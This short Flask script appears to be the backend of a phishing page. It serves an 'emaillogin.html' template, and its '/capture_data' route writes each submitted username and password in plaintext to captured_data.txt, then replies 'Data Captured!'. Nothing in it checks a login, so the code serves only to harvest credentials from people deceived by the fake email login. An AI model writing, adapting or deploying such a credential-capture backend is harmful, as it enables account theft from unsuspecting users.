
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('emaillogin.html')

@app.route('/capture_data', methods=['POST'])
def capture_data():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('captured_data.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    return 'Data Captured!'

if __name__ == '__main__':
    app.run(debug=True)
 